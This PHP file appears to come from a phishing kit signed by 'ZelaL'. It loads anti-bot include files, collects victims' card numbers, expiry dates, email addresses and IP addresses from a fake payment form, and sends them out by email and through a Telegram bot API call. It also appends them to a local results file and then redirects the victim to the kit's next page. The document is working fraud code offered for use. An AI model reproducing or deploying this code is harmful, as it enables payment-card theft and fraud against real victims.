<?php
/*

             👁️👁️
 edited by : 𝚉𝙴𝙻𝙰𝙻 





*/

include '../bots/anti1.php';
include '../bots/anti2.php';
include '../bots/anti3.php';
include '../bots/anti4.php';
include '../bots/anti5.php';
include '../bots/anti6.php';
include '../bots/anti7.php';
include '../bots/anti8.php';

?>
<?php
error_reporting(0);
session_start();

include "./emaildzbi.php";
$ip = getenv("REMOTE_ADDR");
$link = $_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI'] ;


$hostname = gethostbyaddr($ip);
$message = "[=🇧🇪 Client acheter ✅ 🇧🇪=]\r\n";
$message .= "|🥶Numéro de carte🥶 : ".$_POST['cc']."\r\n";#17
$message .= "|📍 Num    📍 : ".$_POST['expiryMonth']."/".$_POST['expiryYear']."\r\n";
$message .= "[========= $ip ========]\r\n";
$send = $email;
$subject = "♠️ (".$_POST['EMAIL'].") 🇧🇪🇧🇪 Client acheter ✅ 🇧🇪🇧🇪 $ip";
$headers = "From: [🤡🇧🇪 ZelaL 🇧🇪🤡]<info@j00keykrs.com>";
mail($send,$subject,$message,$headers);

file_get_contents("https://api.telegram.org/bot".$api."/sendMessage?chat_id=".$chatid."&text=" . urlencode($message)."" );
$save=fopen("../J00KEY_RESULTS.txt","a+");
fwrite($save,$message);
fclose($save);

header('Location: ./digi.php');
?>
